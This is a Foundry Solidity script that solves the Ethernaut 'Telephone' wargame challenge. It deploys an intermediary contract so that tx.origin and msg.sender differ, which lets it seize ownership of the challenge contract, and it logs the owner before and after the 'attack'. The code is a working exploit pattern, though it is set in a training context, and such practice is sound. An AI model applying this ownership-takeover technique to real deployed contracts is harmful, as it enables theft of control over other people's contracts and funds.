// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface Telephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract Caller {
    /// @notice The deployed Telephone contract address.
    Telephone public telephone = Telephone(0x3C0B24955dFeF37A969546b4FA1Ab698B1d8bb38);

    /**
     * @notice Changes the owner of the Telephone contract.
     * @param _owner The address to set as the new owner.
     */
    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }

}

/// @author agadzhalov
/// @title Solution to Telephone Ethernaut challange
/// @notice Solution: tx.origin is always the initiator of the transaction, which means the EOA msg.sender is the address 
///         of the account from which the current call is coming. It can be either a EOA or a smart contract accout.
contract TelephoneScript is Script {

    Telephone public telephone = Telephone(0x3C0B24955dFeF37A969546b4FA1Ab698B1d8bb38);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Caller caller = new Caller();

        // Log the current owner of the Telephone contract
        console.log("1. Owner before attack:", telephone.owner());

        // Execute ownership change to the specified wallet address
        caller.changeOwner(vm.envAddress("WALLLET_ADDRESS"));

        // Log the owner of the Telephone contract after the ownership change
        console.log("2. Owner after attack:", telephone.owner());

        vm.stopBroadcast();
    }
}
